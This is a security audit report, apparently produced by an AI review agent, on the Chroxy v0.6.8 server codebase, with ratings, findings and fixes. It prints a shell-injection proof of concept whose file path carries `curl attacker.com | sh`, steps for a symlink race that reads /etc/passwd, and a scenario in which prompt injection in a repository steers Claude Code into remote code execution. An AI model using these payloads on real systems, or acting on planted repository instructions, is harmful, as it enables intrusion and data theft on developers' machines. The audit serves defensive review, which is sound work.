# Adversary's Audit: Chroxy v0.6.8 Full Codebase

**Agent**: Adversary — Attack surface, abuse cases, security boundaries.
**Overall Rating**: 2.8 / 5
**Date**: 2026-04-05

---

## Section Ratings

### Permission Hook Execution — 2/5

`packages/server/src/permission-hook.js` executes an external shell script specified in config. The hook receives tool name and parameters. The parameter values are passed to the shell script as arguments. If a tool parameter contains shell metacharacters (spaces, semicolons, backticks, `$()`), they will be interpolated by the shell.

**Proof of concept**: If Claude Code calls `write_file` with a path of `` `curl attacker.com | sh` ``, and the permission hook is implemented as:
```bash
#!/bin/bash
TOOL=$1
PATH=$2
# check $PATH
```
...the backtick expression executes. The hook documentation does not warn about this and provides a sample script that uses `$2` directly.

**Evidence**: `packages/server/hooks/permission-hook.sh` sample script; `packages/server/src/permission-hook.js` — argument passing to child_process.

### Symlink TOCTOU — 2/5

As noted in Guardian's report, `ws-file-ops/reader.js` resolves the path but does not atomically prevent symlink substitution between check and read. On Linux (common server OS), inotify watchers can detect file-system changes; an attacker with local access can race the TOCTOU window reliably.

**Attack**: Create `/tmp/evil` → `/etc/passwd`. Ask Chroxy to read `/tmp/evil`. Path check passes (if `/tmp` is in allowed roots). Between check and `fs.readFile`, symlink is in place. `/etc/passwd` is returned to the attacker-controlled client.

### Localhost Encryption Bypass — 3/5

When the Chroxy server is accessed over `localhost` (no tunnel), the E2E encryption layer is still negotiated. This is unnecessarily expensive for local connections and also means the localhost connection uses the same shared key as a remote connection. If an attacker can sniff localhost traffic (e.g., via a malicious process on the same machine), they get encrypted traffic — but crucially, once the nonce reuse issue allows key recovery, localhost connections are also compromised. The encryption overhead on localhost also adds latency.

**More importantly**: If the server starts without `--tunnel` and the user connects over `localhost`, there is no indication that the connection is local/unencrypted vs. remote/encrypted. The UI treats both identically.

### Rate Limiting — 3/5

`rate-limiter.js` implements per-IP rate limiting on WebSocket connections. The limit is applied to the source IP. However, Cloudflare tunnels present a single source IP to the server (the `cloudflared` loopback address). All remote clients appear as `127.0.0.1`. The rate limiter is therefore ineffective against abuse through the tunnel.

**Fix**: Use the `CF-Connecting-IP` header forwarded by Cloudflare, or rate-limit on authenticated client identity (token hash) rather than IP.

### Input Validation on WS Messages — 3/5

`ws-schemas.js` defines Zod schemas for all incoming WS messages. These are validated in `ws-message-handlers.js`. This is good — invalid messages are rejected before reaching handler code. However, the schemas allow arbitrarily-long strings in several fields (`path`, `content`, `query`). A client sending a 10MB `content` field in a write request will allocate 10MB per parse attempt. No max length is enforced.

### Token Exposure in Logs — 3/5

`packages/server/src/logger.js` has a `maskToken()` utility that's applied in some places. However, `config.js` logs the full config object at startup in DEBUG mode, and the config object includes `apiToken`. If DEBUG logging is enabled in production (common during troubleshooting), the API token appears in logs.

---

## Top 5 Findings

1. **Shell injection in permission hook** (`permission-hook.js`, `hooks/permission-hook.sh`): Tool parameters passed as shell arguments without escaping. Attacker-controlled tool parameters → arbitrary command execution on the server. Fix: pass parameters as JSON via stdin, not as shell arguments. Severity: **Critical**.

2. **Symlink TOCTOU in file reader** (`ws-file-ops/reader.js`): Path validation happens before read; symlink can be substituted in the race window. Fix: use `fs.realpath()` before path validation; hold an open file descriptor across check and read. Severity: **High**.

3. **Rate limiter ineffective through Cloudflare tunnel** (`rate-limiter.js`): All tunnel traffic appears as `127.0.0.1`. Fix: rate-limit on `CF-Connecting-IP` header or authenticated session identity. Severity: **Medium**.

4. **Unbounded WS message fields** (`ws-schemas.js`): No max length on string fields. 10MB `content` field accepted. Fix: add `.max(N)` constraints to string fields in all Zod schemas. Severity: **Medium**.

5. **API token logged in DEBUG mode** (`logger.js`, `config.js`): `apiToken` appears in logged config object. Fix: mask or omit `apiToken` field before logging config. Severity: **Medium**.

---

## Attack Scenarios

**Scenario 1 — Hook injection**: Claude Code (as directed by a malicious prompt in a repository) tries to write a file with a path crafted to inject a shell command. The permission hook executes the command as the server user. Result: RCE on the developer's machine.

**Scenario 2 — File exfiltration via symlink**: Attacker with local machine access (another user on a shared box, or a compromised background process) creates a symlink from a readable-by-Chroxy path to a sensitive file. Connects to Chroxy remotely and reads the symlink target.

**Scenario 3 — DoS via message flooding**: Unauthenticated client (or client with a valid token) sends rapid WS messages with 10MB content fields. Server allocates GBs of memory for Zod parsing. Rate limiter doesn't protect (all appear as localhost).

---

## Overall Verdict

Two critical/high issues need immediate attention: shell injection in the permission hook and the symlink TOCTOU. Both require local attacker access or a specifically crafted Claude Code prompt, but given that Chroxy is designed to run Claude Code on untrusted repositories, prompt injection → tool parameter injection → hook injection is a realistic attack chain. The rate limiting and input validation issues are medium severity but easy to fix. The crypto issues (nonce reuse) are the other agents' primary finding and are the most serious of all.

**Overall Rating: 2.8 / 5**
